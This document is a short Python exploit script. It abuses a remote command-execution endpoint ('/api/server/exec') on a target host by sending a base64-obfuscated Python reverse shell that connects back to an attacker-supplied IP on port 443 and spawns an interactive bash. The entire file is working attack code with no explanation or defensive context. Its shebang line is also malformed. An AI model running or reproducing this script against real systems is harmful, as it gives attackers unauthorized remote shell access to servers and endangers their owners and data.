#!/usr/env/python3

import requests
import json
import base64
import sys

def rev_shell():
    url = "http://"+sys.argv[1]
    rce_endpoint = "/api/server/exec"
    headers = {
	    "Content-Type" : "application/json",
         "User-Agent" : "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5"
        }

    python_shell = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+sys.argv[2]+"""\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
    b64bytes = python_shell.encode("ASCII")
    encoded = base64.b64encode(b64bytes)
    rev_shell = "echo " + str(encoded,'UTF-8') + " | base64 -d | bash"
    data = {"cmd" : rev_shell}
    r = requests.post(url+rce_endpoint, headers = headers, data = json.dumps(data))
    print(r.text)


def main():
   rev_shell()
   

if __name__ == '__main__':
    main()